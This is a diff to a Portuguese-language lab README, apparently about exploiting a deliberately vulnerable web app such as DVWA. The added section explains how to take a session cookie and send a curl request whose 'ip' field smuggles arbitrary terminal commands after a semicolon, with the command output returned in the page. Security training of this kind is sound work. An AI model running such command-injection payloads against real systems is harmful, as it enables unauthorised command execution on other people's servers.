@@ -180,6 +180,20 @@ Resultados/artefatos em:
 
 ## 8) Exploração 2 - Command Injection
 > **Nota:** O passo a passo detalhado da exploração com sqlmap está em [command_injection_steps.md](./command_injection_steps.md).
+### 8.1 Obter cookie de sessão (PHPSESSID) (vide experimento anterior)
+
+### 8.2 Rodar o comando de teste
+```bash
+curl -X POST "http://URL_DO_SITE/vulnerabilities/exec"  -H "Cookie: PHPSESSID=SEU_COOKIE; security=low" --data "ip=QUALQUER_IP;[ COMANDOS DE TERMINAL ]&Submit=Submit"
+```
+
+este comando:
+- verifica o conteúdo da URL do container específico;
+- usa o cookie para evitar redirecionamento para login;
+- aplica o command injection com base em algum IP que está requisitando;
+
+Resultados:
+- HTML da página com o resultado do comando de terminal desejado pelo atacante
 
 ## 9) Entendendo os arquivos de output (o que cada um significa)
 
